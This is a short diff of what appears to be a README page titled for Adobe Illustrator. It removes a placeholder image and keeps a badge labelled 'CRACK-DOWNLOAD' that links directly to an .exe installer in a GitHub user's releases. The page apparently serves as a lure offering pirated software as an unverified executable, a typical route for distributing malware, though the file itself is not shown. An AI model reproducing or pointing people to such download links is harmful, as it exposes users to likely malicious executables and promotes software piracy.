@@ -3,7 +3,6 @@
 
 <h1>Adobe Illustrator: Craft Stunning Vector Graphics with Precision</h1>
 
-<p dir="ltr"><img src="placeholder_illustrator.jpg" alt="Adobe Illustrator" style="max-width: 100%;"></p> <!-- Replace with a real Adobe Illustrator image -->
 
 [<img src="https://img.shields.io/badge/Adobe-Illustrator-CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/Adobe-Illustrator-Full-2024-2025/releases/download/2/installer-Adobe-Illustrator.exe)
 
